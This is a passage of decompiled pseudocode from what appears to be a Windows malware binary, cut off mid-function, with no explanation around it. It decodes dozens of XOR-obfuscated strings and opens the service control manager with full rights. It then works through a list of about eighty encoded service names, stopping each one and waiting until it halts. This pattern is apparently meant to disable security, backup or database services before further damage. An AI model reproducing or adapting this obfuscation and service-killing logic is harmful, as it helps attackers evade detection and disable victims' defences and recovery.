LOBYTE(STACK[0x6EA]) = v196 ^ 0x37;\n  LOBYTE(STACK[0x6EC]) = v196 ^ 0x3B;\n  v201 = 92;\n  LOBYTE(STACK[0xA47]) = 0;\n  v202 = 0;\n  LOBYTE(STACK[0x5F8]) = 0;\n  LOBYTE(STACK[0x6EB]) = v198;\n  LOBYTE(STACK[0x6ED]) = v199;\n  LOBYTE(STACK[0x6F0]) = v200;\n  LOBYTE(STACK[0x6F1]) = 0;\n  STACK[0x841] = 1059598172;\n  STACK[0x845] = 725429763;\n  STACK[0x849] = 960183555;\n  strcpy((char *)&STACK[0x84D], \"2(\");\n  while ( 1 )\n  {\n    *((_BYTE *)&STACK[0x842] + v202++) ^= v201;\n    if ( v202 >= 0xD )\n      break;\n    v201 = STACK[0x841];\n  }\n  LOBYTE(STACK[0x6D2]) = 96;\n  v203 = LOBYTE(STACK[0x6D2]) ^ 0x33;\n  LOBYTE(STACK[0x6D3]) = LOBYTE(STACK[0x6D2]) ^ 0x36;\n  LOBYTE(STACK[0x6D4]) = v203;\n  v204 = STACK[0x6D2];\n  v205 = LOBYTE(STACK[0x6D2]) ^ 0x33;\n  LOBYTE(STACK[0x6DB]) = 0;\n  LOBYTE(STACK[0x6D9]) = v205;\n  LOBYTE(STACK[0x6D7]) = v204 ^ 0x30;\n  v206 = v204 ^ 0x36;\n  LOBYTE(STACK[0x84F]) = 0;\n  v207 = v204 ^ 0x33;\n  LOBYTE(STACK[0x6D5]) = v204 ^ 0x2E;\n  LOBYTE(STACK[0x6D6]) = v204 ^ 0x21;\n  v208 = 0;\n  LOBYTE(STACK[0x6D8]) = v206;\n  LOBYTE(STACK[0x6DA]) = v207;\n  LOBYTE(STACK[0x6DB]) = 0;\n  *(_OWORD *)&STACK[0xA5E] = xmmword_424C20;\n  strcpy((char *)&STACK[0xA6E], \"xm\");\n  do\n    *((_BYTE *)&STACK[0xA5F] + v208++) ^= LOBYTE(STACK[0xA5E]);\n  while ( v208 < 0x11 );\n  v209 = 0;\n  LOBYTE(STACK[0xA70]) = 0;\n  *(_OWORD *)&STACK[0x935] = xmmword_424E00;\n  STACK[0x945] = 2071947358;\n  STACK[0x949] = 6844004;\n  do\n    *((_BYTE *)&STACK[0x936] + v209++) ^= LOBYTE(STACK[0x935]);\n  while ( v209 < 0x16 );\n  LOBYTE(STACK[0x94C]) = 0;\n  v210 = 117;\n  STACK[0x764] = 269493109;\n  v211 = 0;\n  STACK[0x768] = 859510804;\n  STACK[0x76C] = 369305126;\n  LOBYTE(STACK[0x770]) = 0;\n  while ( 1 )\n  {\n    *((_BYTE *)&STACK[0x765] + v211++) ^= v210;\n    if ( v211 >= 0xB )\n      break;\n    v210 = STACK[0x764];\n  }\n  LOBYTE(STACK[0x770]) = 0;\n  v212 = 46;\n  strcpy((char *)&STACK[0x7C7], \".oM\\\\A@G]oIK@Z\");\n  v213 = 0;\n  while ( 1 )\n  {\n    *((_BYTE *)&STACK[0x7C8] + v213++) ^= v212;\n    if ( v213 >= 0xC )\n      break;\n    v212 = STACK[0x7C7];\n  }\n  LOBYTE(STACK[0x73D]) = 47;\n  LOBYTE(STACK[0x785]) = 113;\n  LOBYTE(STACK[0x787]) = 82;\n  LOBYTE(STACK[0x786]) = 65;\n  LOBYTE(STACK[0x78A]) = 0;\n  LOBYTE(STACK[0x748]) = 0;\n  LOBYTE(STACK[0x788]) = 83;\n  LOBYTE(STACK[0x7D4]) = 0;\n  LOBYTE(STACK[0x789]) = 77;\n  v214 = LOBYTE(STACK[0x73D]) ^ 0x4C;\n  LOBYTE(STACK[0x73E]) = LOBYTE(STACK[0x73D]) ^ 0x6E;\n  LOBYTE(STACK[0x73F]) = v214;\n  v215 = STACK[0x73D];\n  LOBYTE(STACK[0x744]) = LOBYTE(STACK[0x73D]) ^ 0x1D;\n  v216 = v215 ^ 0x7C;\n  LOBYTE(STACK[0x745]) = v215 ^ 0x7C;\n  v217 = v215 ^ 0x47;\n  LOBYTE(STACK[0x740]) = v215 ^ 0x5D;\n  LOBYTE(STACK[0x746]) = v215 ^ 0x59;\n  v218 = 89;\n  v219 = v215 ^ 0x4C;\n  LOBYTE(STACK[0x742]) = v215 ^ 0x4C;\n  LOBYTE(STACK[0x78A]) = 0;\n  v220 = 0;\n  LOBYTE(STACK[0x741]) = v216;\n  LOBYTE(STACK[0x743]) = v217;\n  LOBYTE(STACK[0x747]) = v219;\n  LOBYTE(STACK[0x748]) = 0;\n  STACK[0x823] = 169351769;\n  STACK[0x827] = 493559064;\n  STACK[0x82B] = 171654158;\n  strcpy((char *)&STACK[0x82F], \"/:\");\n  while ( 1 )\n  {\n    *((_BYTE *)&STACK[0x824] + v220++) ^= v218;\n    if ( v220 >= 0xD )\n      break;\n    v218 = STACK[0x823];\n  }\n  v221 = 0;\n  LOBYTE(STACK[0x831]) = 0;\n  *(_OWORD *)&STACK[0xC4C] = xmmword_4243D0;\n  do\n    *((_BYTE *)&STACK[0xC4D] + v221++) ^= LOBYTE(STACK[0xC4C]);\n  while ( v221 < 0xE );\n  LOBYTE(STACK[0xC5B]) = 0;\n  v222 = 116;\n  STACK[0x798] = 908534644;\n  v223 = 0;\n  STACK[0x79C] = 471272497;\n  STACK[0x7A0] = 286464533;\n  LOBYTE(STACK[0x7A4]) = 0;\n  while ( 1 )\n  {\n    *((_BYTE *)&STACK[0x799] + v223++) ^= v222;\n    if ( v223 >= 0xB )\n      break;\n    v222 = STACK[0x798];\n  }\n  LOBYTE(STACK[0x749]) = 42;\n  v224 = LOBYTE(STACK[0x749]) ^ 0x79;\n  LOBYTE(STACK[0x74A]) = LOBYTE(STACK[0x749]) ^ 0x67;\n  LOBYTE(STACK[0x74B]) = v224;\n  v225 = STACK[0x749];\n  vars3b = 75;\n  LOBYTE(STACK[0x750]) = LOBYTE(STACK[0x749]) ^ 0x4B;\n  v226 = v225 ^ 0x52;\n  v227 = v225 ^ 0x42;\n  LOBYTE(STACK[0x751]) = v225 ^ 0x44;\n  LOBYTE(STACK[0x752]) = v225 ^ 0x4D;\n  v228 = v225 ^ 0x4F;\n  LOBYTE(STACK[0x754]) = 0;\n  LOBYTE(STACK[0x74C]) = v225 ^ 0x6F;\n  v229 = 40;\n  LOBYTE(STACK[0x74E]) = v225 ^ 0x49;\n  v230 = 0;\n  LOBYTE(STACK[0x7A4]) = 0;\n  LOBYTE(STACK[0x74D]) = v226;\n  LOBYTE(STACK[0x74F]) = v227;\n  LOBYTE(STACK[0x753]) = v228;\n  LOBYTE(STACK[0x754]) = 0;\n  STACK[0x7A5] = 1836803368;\n  STACK[0x7A9] = 1228950352;\n  STACK[0x7AD] = 206393158;\n  LOBYTE(STACK[0x7B1]) = 0;\n  while ( 1 )\n  {\n    *((_BYTE *)&STACK[0x7A6] + v230++) ^= v229;\n    if ( v230 >= 0xB )\n      break;\n    v229 = STACK[0x7A5];\n  }\n  LOBYTE(STACK[0x7B1]) = 0;\n  v231 = OpenSCManagerA(0, 0, 0xF003Fu);\n  STACK[0x628] = (unsigned int)v231;\n  if ( !v231 && NtCurrentTeb()->LastErrorValue == 5 )\n    goto LABEL_129;\n  STACK[0xCA8] = (unsigned int)&STACK[0x60C];\n  STACK[0xCAC] = (unsigned int)&STACK[0x667];\n  STACK[0xCB0] = (unsigned int)&STACK[0x6A1];\n  STACK[0xCB4] = (unsigned int)&STACK[0x6AB];\n  STACK[0xCB8] = (unsigned int)&STACK[0x615];\n  STACK[0xCBC] = (unsigned int)&STACK[0x5C7];\n  STACK[0xCC0] = (unsigned int)&STACK[0x6B5];\n  STACK[0xCC4] = (unsigned int)&STACK[0x6BF];\n  STACK[0xCC8] = (unsigned int)&STACK[0x6F3];\n  STACK[0xCCC] = (unsigned int)&STACK[0x5AC];\n  STACK[0xCD0] = (unsigned int)&STACK[0x655];\n  STACK[0xCD4] = (unsigned int)&STACK[0x6C9];\n  STACK[0xCD8] = (unsigned int)&STACK[0x772];\n  STACK[0xCDC] = (unsigned int)&STACK[0x9AD];\n  STACK[0xCE0] = (unsigned int)&STACK[0xA09];\n  STACK[0xCE4] = (unsigned int)&STACK[0x61E];\n  STACK[0xCE8] = (unsigned int)&STACK[0x5E8];\n  STACK[0xCEC] = (unsigned int)&STACK[0x5BE];\n  STACK[0xCF0] = (unsigned int)&STACK[0x815];\n  STACK[0xCF4] = (unsigned int)&STACK[0x9C4];\n  STACK[0xCF8] = (unsigned int)&STACK[0xC29];\n  STACK[0xCFC] = (unsigned int)&STACK[0x5D6];\n  STACK[0xD00] = (unsigned int)&STACK[0x671];\n  STACK[0xD04] = (unsigned int)&STACK[0xA1D];\n  STACK[0xD08] = (unsigned int)&STACK[0xB41];\n  STACK[0xD0C] = (unsigned int)&STACK[0x9DB];\n  STACK[0xD10] = (unsigned int)&STACK[0x732];\n  STACK[0xD14] = (unsigned int)&STACK[0x6FE];\n  STACK[0xD18] = (unsigned int)&STACK[0x833];\n  STACK[0xD1C] = (unsigned int)&STACK[0xA49];\n  STACK[0xD20] = (unsigned int)&STACK[0x5FA];\n  STACK[0xD24] = (unsigned int)&STACK[0x94E];\n  STACK[0xD28] = (unsigned int)&STACK[0x97E];\n  STACK[0xD2C] = (unsigned int)&STACK[0x903];\n  STACK[0xD30] = (unsigned int)&STACK[0xC16];\n  STACK[0xD34] = (unsigned int)&STACK[0x996];\n  STACK[0xD38] = (unsigned int)&STACK[0xA72];\n  STACK[0xD3C] = (unsigned int)&STACK[0xC3B];\n  STACK[0xD40] = (unsigned int)&STACK[0x871];\n  STACK[0xD44] = (unsigned int)&STACK[0x8CB];\n  STACK[0xD48] = (unsigned int)&STACK[0x966];\n  v232 = 0;\n  STACK[0xDE8] = 0;\n  STACK[0xD4C] = (unsigned int)&STACK[0xA87];\n  STACK[0xD50] = (unsigned int)&STACK[0x78C];\n  STACK[0xD54] = (unsigned int)&STACK[0x807];\n  STACK[0xD58] = (unsigned int)&STACK[0x6DD];\n  STACK[0xD5C] = (unsigned int)&STACK[0x71F];\n  STACK[0xD60] = (unsigned int)&STACK[0x756];\n  STACK[0xD64] = (unsigned int)&STACK[0x5D1];\n  STACK[0xD68] = (unsigned int)&STACK[0x780];\n  STACK[0xD6C] = (unsigned int)&STACK[0x7B3];\n  STACK[0xD70] = (unsigned int)&STACK[0x679];\n  STACK[0xD74] = (unsigned int)&STACK[0x681];\n  STACK[0xD78] = (unsigned int)&STACK[0x689];\n  STACK[0xD7C] = (unsigned int)&STACK[0x691];\n  STACK[0xD80] = (unsigned int)&STACK[0x7F2];\n  STACK[0xD84] = (unsigned int)&STACK[0x699];\n  STACK[0xD88] = (unsigned int)&STACK[0x7EB];\n  STACK[0xD8C] = (unsigned int)&STACK[0x7F9];\n  STACK[0xD90] = (unsigned int)&STACK[0x9F2];\n  STACK[0xD94] = (unsigned int)&STACK[0x8E7];\n  STACK[0xD98] = (unsigned int)&STACK[0x91E];\n  STACK[0xD9C] = (unsigned int)&STACK[0x890];\n  STACK[0xDA0] = (unsigned int)&STACK[0xA9C];\n  STACK[0xDA4] = (unsigned int)&STACK[0x8AE];\n  STACK[0xDA8] = (unsigned int)&STACK[0xA33];\n  STACK[0xDAC] = (unsigned int)&STACK[0x5F1];\n  STACK[0xDB0] = (unsigned int)&STACK[0x6E8];\n  STACK[0xDB4] = (unsigned int)&STACK[0x842];\n  STACK[0xDB8] = (unsigned int)&STACK[0x6D3];\n  STACK[0xDBC] = (unsigned int)&STACK[0xA5F];\n  STACK[0xDC0] = (unsigned int)&STACK[0x936];\n  STACK[0xDC4] = (unsigned int)&STACK[0x765];\n  STACK[0xDC8] = (unsigned int)&STACK[0x7C8];\n  STACK[0xDCC] = (unsigned int)&STACK[0x786];\n  STACK[0xDD0] = (unsigned int)&STACK[0x73E];\n  STACK[0xDD4] = (unsigned int)&STACK[0x824];\n  STACK[0xDD8] = (unsigned int)&STACK[0xC4D];\n  STACK[0xDDC] = (unsigned int)&STACK[0x799];\n  STACK[0xDE0] = (unsigned int)&STACK[0x74A];\n  STACK[0xDE4] = (unsigned int)&STACK[0x7A6];\n  while ( 1 )\n  {\n    TickCount = (char *)GetTickCount();\n    v233 = OpenServiceA((SC_HANDLE)STACK[0x628], (LPCSTR)*(&STACK[0xCA8] + v232), 0x2Cu);\n    if ( !v233 )\n      goto LABEL_126;\n    if ( !QueryServiceStatusEx(v233, SC_STATUS_PROCESS_INFO, (LPBYTE)&STACK[0xC5C], 0x24u, &STACK[0x868]) )\n    {\nLABEL_97:\n      v565 = v233;\n      v234 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;\n      CloseServiceHandle(v565);\n      goto LABEL_127;\n    }\n    if ( STACK[0xC60] == 1 )\n    {\n      v235 = 0;\n      *(_OWORD *)&STACK[0xB54] = xmmword_424600;\n      STACK[0xB64] = 789784;\n      do\n        *((_BYTE *)&STACK[0xB55] + v235++) ^= LOBYTE(STACK[0xB54]);\n      while ( v235 < 0x12 );\n      v566 = *(&STACK[0xCA8] + v232);\n      LOBYTE(STACK[0xB67]) = 0;\n      sub_40A0B0((LPCSTR)&STACK[0xB55], v566);\n      v567 = v233;\n      v234 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;\n      CloseServiceHandle(v567);\n      goto LABEL_127;\n    }\n    if ( STACK[0xC60] == 3 )\n    {\n      while ( 1 )\n      {\n        v236 = STACK[0xC74] / 0xA;\n        if ( v236 >= 0x3E8 )\n        {\n          if ( v236 > 0x2710 )\n            v236 = 10000;\n        }\n        else\n        {\n          v236 = 1000;\n        }\n        Sleep(v236);\n        if ( !QueryServiceStatusEx(v233, SC_STATUS_PROCESS_INFO, (LPBYTE)&STACK[0xC5C], 0x24u, &STACK[0x868]) )\n          goto LABEL_113;\n        if ( STACK[0xC60] == 1 )\n          break;\n        if ( GetTickCount() - (unsigned int)TickCount > 0x7530 )\n          goto LABEL_113;\nLABEL_114:\n        if ( STACK[0xC60] != 3 )\n          goto LABEL_115;\n      }\n      v237 = 0;\n      *(_OWORD *)&STACK[0xB68] = xmmword_424AD0;\n      STACK[0xB78] = (unsigned int)&loc_414051 + 4;\n      do\n        *((_BYTE *)&STACK[0xB69] + v237++) ^= LOBYTE(STACK[0xB68]);\n      while ( v237 < 0x12 );\n      v568 = *(&STACK[0xCA8] + v232);\n      LOBYTE(STACK[0xB7B]) = 0;\n      sub_40A0B0((LPCSTR)&STACK[0xB69], v568);\nLABEL_113:\n      ++v232;\n      CloseServiceHandle(v233);\n      goto LABEL_114;\n    }\nLABEL_115:\n    sub_41A260(v233, (SC_HANDLE)STACK[0x628]);\n    if ( !ControlService(v233, 1u, (LPSERVICE_STATUS)&STACK[0xC5C]) )\n      goto LABEL_97;\n    if ( STACK[0xC60] == 1 )\n      goto LABEL_126;\n    while ( 1 )\n    {\n      Sleep(STACK[0xC74]);\n      if ( !QueryServiceStatusEx(v233, SC_STATUS_PROCESS_INFO, (LPBYTE)&STACK[0xC5C], 0x24u, &STACK[0x868]) )\n      {\nLABEL_120:\n        ++v232;\n        CloseServiceHandle(v233);\n        goto LABEL_121;\n      }\n      if ( STACK[0xC60] == 1 )\n        break;\n      if ( GetTickCount() - (unsigned int)TickCount > 0x7530 )\n        goto LABEL_120;\nLABEL_121:\n      if ( STACK[0xC60] == 1 )\n        goto LABEL_126;\n    }\n    v238 = 0;\n    *(_OWORD *)&STACK[0xB7C] = xmmword_424D80;\n    STACK[0xB8C] = 8092271;\n    do\n      *((_BYTE *)&STACK[0xB7D] + v238++) ^= LOBYTE(STACK[0xB7C]);\n    while ( v238 < 0x12 );\n    v569 = *(&STACK[0xCA8] + v232);\n    LOBYTE(STACK[0xB8F]) = 0;\n    sub_40A0B0((LPCSTR)&STACK[0xB7D], v569);\nLABEL_126:\n    v234 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;\nLABEL_127:\n    ++v232;\n    if ( !*(&STACK[0xCA8] + v232) )\n    {\n      v234((SC_HANDLE)STACK[0x628]);\nLABEL_129:\n      CoInitializeEx(0, 6u);\n      *(_OWORD *)&STACK[0x1037] = xmmword_424CD0;\n      LOBYTE(STACK[0x5A2]) = 67;\n      v239 = LOBYTE(STACK[0x5A2]) ^ 0x20;\n      *(_OWORD *)&STACK[0x1047] = xmmword_424CC0;\n      LOBYTE(STACK[0x5A3]) = v239;\n      v240 = STACK[0x5A2];\n      *(_OWORD *)&STACK[0x1057] = xmmword_424DF0;\n      v241 = v240 ^ 0x2E;\n      v242 = v240 ^ 0x27;\n      v243 = v240 ^ 0x6D;\n      *(_OWORD *)&STACK[0x1067] = xmmword_424D60;\n      v244 = v240 ^ 0x3B;\n      vars3c = 38;\n      v245 = v240 ^ 0x26;\n      v246 = LOBYTE(STACK[0x5A2]) ^ 0x26;\n      *(_OWORD *)&STACK[0x1077] = xmmword_424720;\n      LOBYTE(STACK[0x5A4]) = v241;\n      *(_OWORD *)&STACK[0x1087] = xmmword_424EA0;\n      LOBYTE(STACK[0x5A7]) = v245;\n      *(_OWORD *)&STACK[0x1097] = xmmword_424E10;\n      LOBYTE(STACK[0x5A5]) = v242;\n      *(_OWORD *)&STACK[0x10A7] = xmmword_424CE0;\n      LOBYTE(STACK[0x5A6]) = v243;\n      *(_OWORD *)&STACK[0x10B7] = xmmword_424D20;\n      LOBYTE(STACK[0x5A8]) = v244;\n      *(_OWORD *)&STACK[0x10C7] = xmmword_424CA0;\n      LOBYTE(STACK[0x5A9]) = v246;\n      LOBYTE(STACK[0x5AA]) = 0;\n      LOBYTE(STACK[0x7DB]) = 0;\n      LOBYTE(STACK[0x7D7]) = 117;\n      *(_OWORD *)&STACK[0x10D7] = xmmword_424CB0;\n      LOBYTE(STACK[0x7DA]) = 115;\n      v247 = 0;\n      LOBYTE(STACK[0x5AA]) = 0;\n      LOBYTE(STACK[0x7D5]) = 93;\n      LOBYTE(STACK[0x7D6]) = 114;\n      LOBYTE(STACK[0x7D8]) = 110;\n      LOBYTE(STACK[0x7D9]) = 97;\n      LOBYTE(STACK[0x7DB]) = 0;\n      *(_OWORD *)&STACK[0x10E7] = xmmword_424C80;\n      STACK[0x10F7] = 2049321836;\n      STACK[0x10FB] = 2137940606;\n      LOBYTE(STACK[0x10FF]) = 0;\n      do\n        *((_BYTE *)&STACK[0x1038] + v247++) ^= LOBYTE(STACK[0x1037]);\n      while ( v247 < 0xC7 );\n      LOBYTE(STACK[0x636]) = 76;\n      v248 = LOBYTE(STACK[0x636]) ^ 0x34;\n      LOBYTE(STACK[0x637]) = LOBYTE(STACK[0x636]) ^ 0x3B;\n      vars3d = 41;\n      LOBYTE(STACK[0x638]) = v248;\n      v249 = STACK[0x636];\n      LOBYTE(STACK[0x63D]) = LOBYTE(STACK[0x636]) ^ 0x29;\n      LOBYTE(STACK[0x63F]) = 0;\n      v250 = v249 ^ 0x3A;\n      LOBYTE(STACK[0x639]) = v249 ^ 0x1F;\n      v251 = v249 ^ 0x3E;\n      LOBYTE(STACK[0x63B]) = v249 ^ 0x3E;\n      LOBYTE(STACK[0x10FF]) = 0;\n      v252 = 40;\n      LOBYTE(STACK[0x63A]) = v249 ^ 0x29;\n      v253 = 0;\n      LOBYTE(STACK[0x63C]) = v250;\n      LOBYTE(STACK[0x63E]) = v251;\n      LOBYTE(STACK[0x63F]) = 0;\n      strcpy((char *)&STACK[0x7B9], \"(_P{MZ^MZ~AM_\");\n      while ( 1 )\n      {\n        *((_BYTE *)&STACK[0x7BA] + v253++) ^= v252;\n        if ( v253 >= 0xC )\n          break;\n        v252 = STACK[0x7B9];\n      }\n      LOBYTE(STACK[0x75A]) = 91;\n      v254 = LOBYTE(STACK[0x75A]) ^ 0x2A;\n      LOBYTE(STACK[0x75B]) = LOBYTE(STACK[0x75A]) ^ 0x28;\n      LOBYTE(STACK[0x75C]) = v254;\n      v255 = STACK[0x75A];\n      LOBYTE(STACK[0x761]) = LOBYTE(STACK[0x75A]) ^ 0x3C;\n      v256 = v255 ^ 0x3A;\n      LOBYTE(STACK[0x760]) = v255 ^ 0x35;\n      LOBYTE(STACK[0x762]) = v255 ^ 0x29;\n      LOBYTE(STACK[0x75E]) = v255 ^ 0x36;\n      LOBYTE(STACK[0x708]) = 1;\n      LOBYTE(STACK[0x7E4]) = 82;\n      LOBYTE(STACK[0x75D]) = v255 ^ 0x37;\n      LOBYTE(STACK[0x7E5]) = 65;\n      v257 = LOBYTE(STACK[0x708]) ^ 0x72;\n      v258 = LOBYTE(STACK[0x708]) ^ 0x74;\n      LOBYTE(STACK[0x75F]) = v256;\n      LOBYTE(STACK[0x709]) = v257;\n      LOBYTE(STACK[0x70A]) = v258;\n      v259 = STACK[0x708];\n      v260 = LOBYTE(STACK[0x708]) ^ 0x68;\n      LOBYTE(STACK[0x7E7]) = 117;\n      LOBYTE(STACK[0x7E3]) = 10;\n      LOBYTE(STACK[0x7E6]) = 103;\n      LOBYTE(STACK[0x7E8]) = 105;\n      LOBYTE(STACK[0x70F]) = v260;\n      LOBYTE(STACK[0x763]) = 0;\n      LOBYTE(STACK[0x7E9]) = 0;\n      LOBYTE(STACK[0x7C6]) = 0;\n      LOBYTE(STACK[0x710]) = v259 ^ 0x72;\n      LOBYTE(STACK[0x763]) = 0;\n      LOBYTE(STACK[0x7E9]) = 0;\n      LOBYTE(STACK[0x712]) = 0;\n      LOBYTE(STACK[0x70B]) = v259 ^ 0x71;\n      LOBYTE(STACK[0x70C]) = v259 ^ 0x64;\n      LOBYTE(STACK[0x70D]) = v259 ^ 0x73;\n      LOBYTE(STACK[0x70E]) = v259 ^ 0x77;\n      LOBYTE(STACK[0x602]) = 78;\n      LOBYTE(STACK[0x711]) = v259 ^ 0x64;\n      LOBYTE(STACK[0x640]) = 98;\n      LOBYTE(STACK[0x603]) = LOBYTE(STACK[0x602]) ^ 0xD;\n      v261 = STACK[0x602];\n      LOBYTE(STACK[0x604]) = LOBYTE(STACK[0x602]) ^ 0x3B;\n      LOBYTE(STACK[0x605]) = v261 ^ 0x22;\n      LOBYTE(STACK[0x606]) = v261 ^ 0x3A;\n      LOBYTE(STACK[0x607]) = v261 ^ 0x3B;\n      v262 = LOBYTE(STACK[0x640]) ^ 7;\n      LOBYTE(STACK[0x609]) = LOBYTE(STACK[0x602]) ^ 0x2B;\n      LOBYTE(STACK[0x642]) = v262;\n      v263 = STACK[0x640];\n      LOBYTE(STACK[0x641]) = LOBYTE(STACK[0x640]) ^ 0x26;\n      LOBYTE(STACK[0x608]) = v261 ^ 0x3C;\n      LOBYTE(STACK[0x647]) = v263 ^ 1;\n      LOBYTE(STACK[0x644]) = v263 ^ 0x15;\n      LOBYTE(STACK[0x648]) = v263 ^ 0xA;\n      LOBYTE(STACK[0x5B4]) = 66;\n      LOBYTE(STACK[0x643]) = v263 ^ 4;\n      v264 = LOBYTE(STACK[0x5B4]) ^ 0x35;\n      LOBYTE(STACK[0x645]) = v263 ^ 3;\n      LOBYTE(STACK[0x646]) = v263 ^ 0x16;\n      LOBYTE(STACK[0x5B5]) = v264;\n      v265 = STACK[0x5B4];\n      v266 = LOBYTE(STACK[0x5B4]) ^ 0x2B;\n      LOBYTE(STACK[0x60A]) = 0;\n      LOBYTE(STACK[0x649]) = 0;\n      LOBYTE(STACK[0x712]) = 0;\n      LOBYTE(STACK[0x60A]) = 0;\n      LOBYTE(STACK[0x649]) = 0;\n      LOBYTE(STACK[0x5BC]) = 0;\n      LOBYTE(STACK[0x5B6]) = v266;\n      LOBYTE(STACK[0x5B7]) = v265 ^ 0x2C;\n      LOBYTE(STACK[0x5B8]) = v265 ^ 0x35;\n      LOBYTE(STACK[0x5B9]) = v265 ^ 0x2D;\n      LOBYTE(STACK[0x5BA]) = v265 ^ 0x30;\n      LOBYTE(STACK[0x5BB]) = LOBYTE(STACK[0x5B4]) ^ 0x26;\n      LOBYTE(STACK[0x80F]) = 66;\n      LOBYTE(STACK[0x5DE]) = 115;\n      LOBYTE(STACK[0x80E]) = 81;\n      LOBYTE(STACK[0x80D]) = 5;\n      LOBYTE(STACK[0x810]) = 87;\n      LOBYTE(STACK[0x811]) = 51;\n      LOBYTE(STACK[0x64A]) = 84;\n      LOBYTE(STACK[0x812]) = 50;\n      LOBYTE(STACK[0x5DF]) = LOBYTE(STACK[0x5DE]) ^ 0x22;\n      v267 = STACK[0x5DE];\n      LOBYTE(STACK[0x5E0]) = LOBYTE(STACK[0x5DE]) ^ 0x31;\n      LOBYTE(STACK[0x5E1]) = v267 ^ 0x37;\n      LOBYTE(STACK[0x5E2]) = v267 ^ 0x31;\n      LOBYTE(STACK[0x813]) = 0;\n      LOBYTE(STACK[0x5E3]) = v267 ^ 0x3E;\n      v268 = v267 ^ 0x14;\n      LOBYTE(STACK[0x5E6]) = 0;\n      v269 = LOBYTE(STACK[0x64A]) ^ 0x36;\n      LOBYTE(STACK[0x5E5]) = LOBYTE(STACK[0x5DE]) ^ 1;\n      LOBYTE(STACK[0x64B]) = LOBYTE(STACK[0x64A]) ^ 0x25;\n      LOBYTE(STACK[0x64C]) = v269;\n      v270 = STACK[0x64A];\n      v271 = LOBYTE(STACK[0x64A]) ^ 0x20;\n      LOBYTE(STACK[0x5E4]) = v268;\n      LOBYTE(STACK[0x651]) = v271;\n      LOBYTE(STACK[0x653]) = 0;\n      LOBYTE(STACK[0x5BC]) = 0;\n      LOBYTE(STACK[0x813]) = 0;\n      LOBYTE(STACK[0x5E6]) = 0;\n      LOBYTE(STACK[0x652]) = v270 ^ 0x31;\n      LOBYTE(STACK[0x64D]) = v270 ^ 0x21;\n      LOBYTE(STACK[0x64E]) = v270 ^ 0x24;\n      LOBYTE(STACK[0x64F]) = v270 ^ 0x30;\n      LOBYTE(STACK[0x650]) = v270 ^ 0x35;\n      LOBYTE(STACK[0x653]) = 0;\n      LOBYTE(STACK[0x713]) = 105;\n      v272 = LOBYTE(STACK[0x713]) ^ 0x11;\n      LOBYTE(STACK[0x714]) = LOBYTE(STACK[0x713]) ^ 8;\n      LOBYTE(STACK[0x715]) = v272;\n      v273 = STACK[0x713];\n      LOBYTE(STACK[0x71A]) = LOBYTE(STACK[0x713]) ^ 0xD;\n      LOBYTE(STACK[0x71B]) = v273 ^ 0xE;\n      LOBYTE(STACK[0x716]) = v273 ^ 5;\n      LOBYTE(STACK[0x71C]) = v273 ^ 0xC;\n      LOBYTE(STACK[0x719]) = v273;\n      LOBYTE(STACK[0x725]) = 77;\n      LOBYTE(STACK[0x717]) = v273 ^ 0xB;\n      LOBYTE(STACK[0x7DE]) = 116;\n      LOBYTE(STACK[0x718]) = v273 ^ 0x1B;\n      LOBYTE(STACK[0x7DD]) = 104;\n      v274 = LOBYTE(STACK[0x725]) ^ 0x29;\n      LOBYTE(STACK[0x726]) = LOBYTE(STACK[0x725]) ^ 0x2B;\n      vars3e = 46;\n      LOBYTE(STACK[0x727]) = v274;\n      v275 = STACK[0x725];\n      v276 = LOBYTE(STACK[0x725]) ^ 0x2E;\n      LOBYTE(STACK[0x7DC]) = 29;\n      LOBYTE(STACK[0x7DF]) = 116;\n      LOBYTE(STACK[0x7E0]) = 112;\n      LOBYTE(STACK[0x7E1]) = 100;\n      LOBYTE(STACK[0x72C]) = v276;\n      LOBYTE(STACK[0x7E2]) = 0;\n      LOBYTE(STACK[0x71D]) = 0;\n      LOBYTE(STACK[0x7E2]) = 0;\n      LOBYTE(STACK[0x730]) = 0;\n      LOBYTE(STACK[0x728]) = v275 ^ 0x21;\n      LOBYTE(STACK[0x729]) = v275 ^ 0x2C;\n      LOBYTE(STACK[0x72A]) = v275 ^ 0x38;\n      LOBYTE(STACK[0x72B]) = v275 ^ 0x23;\n      LOBYTE(STACK[0x72D]) = v275 ^ 0x25;\n      LOBYTE(STACK[0x730]) = 0;\n      LOBYTE(STACK[0x72E]) = v275 ^ 0x28;\n      strcpy((char *)&STACK[0x62C], \"/b\\\\k[|]Y]\");\n      LOBYTE(STACK[0x72F]) = v275 ^ 0x3F;\n      v277 = 47;\n      v278 = 0;\n      while ( 1 )\n      {\n        vars3f = v277 ^ *((_BYTE *)&STACK[0x62D] + v278);\n        v279 = sub_401010((char *)&STACK[0x62D], v278++);\n        *v279 = vars3f;\n        if ( v278 >= 8 )\n          break;\n        v277 = STACK[0x62C];\n      }\n      *sub_401010((char *)&STACK[0x62D], 8) = 0;\n      STACK[0x628] = (unsigned int)sub_401000(&STACK[0x62D]);\n      BYTE1(a8) = 63;\n      BYTE2(a8) = sub_401120((_BYTE *)&a8 + 1, 106);\n      HIBYTE(a8) = sub_401120((_BYTE *)&a8 + 1, 97);\n      LOBYTE(a9) = sub_401120((_BYTE *)&a8 + 1, 118);\n      BYTE1(a9) = sub_401120((_BYTE *)&a8 + 1, 97);\n      v280 = 0;\n      BYTE2(a9) = 0;\n      do\n      {\n        v281 = sub_401010((char *)&a8 + 2, v280);\n        LOBYTE(v281) = *v281;\n        TickCount = v281;\n        v282 = sub_401010((char *)&a8 + 2, v280++);\n        *v282 = sub_401120((_BYTE *)&a8 + 1, (char)TickCount);\n      }\n      while ( v280 < 4 );\n      *sub_401010((char *)&a8 + 2, 4) = 0;\n      STACK[0xAF4] = (unsigned int)sub_401000((char *)&a8 + 2);\n      LOBYTE(a13) = 44;\n      BYTE1(a13) = sub_401120(&a13, 51);\n      BYTE2(a13) = sub_401120(&a13, 54);\n      HIBYTE(a13) = sub_401120(&a13, 48);\n      LOBYTE(a14) = sub_401120(&a13, 115);\n      BYTE1(a14) = sub_401120(&a13, 101);\n      v283 = 0;\n      BYTE2(a14) = 0;\n      do\n      {\n        v284 = sub_401010((char *)&a13 + 1, v283);\n        LOBYTE(v284) = *v284;\n        TickCount = v284;\n        v285 = sub_401010((char *)&a13 + 1, v283++);\n        *v285 = sub_401120(&a13, (char)TickCount);\n      }\n      while ( v283 < 5 );\n      